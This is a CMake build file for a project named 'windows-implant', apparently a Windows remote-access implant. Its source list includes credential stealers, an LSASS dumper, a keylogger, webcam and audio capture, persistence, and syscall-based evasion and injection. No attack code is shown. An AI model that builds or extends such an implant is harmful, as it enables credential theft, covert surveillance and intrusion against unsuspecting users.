cmake_minimum_required(VERSION 3.20)
project(windows-implant LANGUAGES CXX)

if(POLICY CMP0135)
  cmake_policy(SET CMP0135 NEW)
endif()

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

include(cmake/CompileOptions.cmake)
include(FetchContent)

enable_language(ASM_MASM)

# nlohmann-json
FetchContent_Declare(
    json
    URL https://github.com/nlohmann/json/releases/download/v3.11.2/json.tar.xz
    DOWNLOAD_EXTRACT_TIMESTAMP TRUE
)
FetchContent_MakeAvailable(json)

# googletest
FetchContent_Declare(
  googletest
  URL https://github.com/google/googletest/archive/refs/heads/main.zip
  DOWNLOAD_EXTRACT_TIMESTAMP TRUE
)
# For Windows: Prevent overriding the parent project's compiler/linker settings
set(gtest_force_shared_crt ON CACHE BOOL "" FORCE)
FetchContent_MakeAvailable(googletest)

add_executable(main WIN32
    src/main.cpp
    src/core/ImplantId.cpp
    src/crypto/AesGcm.cpp
    src/crypto/Base64.cpp
    src/http/WinHttpClient.cpp
    src/http/RedirectorResolver.cpp
    src/beacon/Beacon.cpp
    src/beacon/TaskDispatcher.cpp
    src/recon/WmiHelpers.cpp
    src/recon/SysInfo.cpp
    src/recon/InstalledSoftware.cpp
    src/persistence/Persistence.cpp
    src/wifi/WifiDumper.cpp
    src/utils/Exec.cpp
    src/credential/ChromiumStealer.cpp
    src/credential/FirefoxStealer.cpp
    src/capture/Screenshot.cpp
    src/capture/Keylogger.cpp
    src/capture/Audio.cpp
    src/capture/Webcam.cpp
    src/streaming/Streamer.cpp
    src/shell/InteractiveShell.cpp
    src/fs/FileSystem.cpp
    src/recon/DeepRecon.cpp
    src/evasion/Syscalls.cpp
    src/evasion/SyscallStub.asm
    src/evasion/Unhooker.cpp
    src/evasion/Injector.cpp
    src/execution/DotNetExecutor.cpp
    src/network/SocksProxy.cpp
    src/persistence/WmiPersistence.cpp
    src/persistence/ComHijacker.cpp
    src/credential/LsassDumper.cpp
    external/sqlite3/sqlite3.c
)

target_include_directories(main PUBLIC external external/sqlite3)
target_link_libraries(main 
    nlohmann_json::nlohmann_json
    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 mscoree dbghelp
)

# Tests
add_executable(unit_tests
    tests/Base64Test.cpp
    tests/AesGcmTest.cpp
    src/crypto/Base64.cpp
    src/crypto/AesGcm.cpp
)
target_include_directories(unit_tests PRIVATE src)
target_link_libraries(unit_tests GTest::gtest_main bcrypt)
add_custom_command(TARGET unit_tests POST_BUILD
    COMMAND unit_tests
    WORKING_DIRECTORY ${CMAKE_CURRENT_BINARY_DIR}
)
